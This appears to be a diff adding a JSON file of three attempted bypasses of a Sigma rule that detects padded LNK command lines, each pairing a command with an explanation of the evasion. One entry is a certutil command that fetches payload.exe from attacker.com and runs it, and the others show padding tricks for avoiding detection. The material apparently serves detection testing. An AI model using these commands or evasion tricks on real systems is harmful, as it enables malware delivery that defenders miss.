@@ -1,0 +1,14 @@
+[
+  {
+    "output": "C:\\Windows\\System32\\cmd.exe /c \"powershell.exe -Command Write-Host 'Malicious Payload Executed'\"",
+    "explanation": "This command bypasses the rule by omitting the specific whitespace padding patterns defined in 'selection_cmd'. The Sigma rule specifically looks for long strings of spaces (0x20) or non-printable characters like Line Feed (\\u000A) and Carriage Return (\\u000D). By executing a standard command string without excessive padding or hidden characters, the detection logic is not triggered, even if the execution originates from an LNK file."
+  },
+  {
+    "output": "C:\\Windows\\System32\\calc.exe                       ",
+    "explanation": "The rule looks for a specific length of space padding (17 consecutive spaces in the selection_cmd). If an attacker uses fewer than 17 spaces (e.g., 10-15 spaces) followed by a short obfuscated command, or uses alternative character sets not covered by the regex/list (like non-breaking spaces if supported by the parser), the rule will fail to trigger."
+  },
+  {
+    "output": "C:\\Windows\\System32\\cmd.exe /c \"certutil.exe -urlcache -f http://attacker.com/payload.exe C:\\temp\\p.exe && C:\\temp\\p.exe\"",
+    "explanation": "This bypass targets the 'selection_img' and 'selection_cmd' logic. The rule assumes the malicious activity happens immediately upon the LNK execution with specific padding. If the LNK launches a legitimate process (like a script or a native binary) that then fetches and executes the payload in a separate process tree or via a method that doesn't require LNK-level command-line padding, the rule is bypassed."
+  }
+]
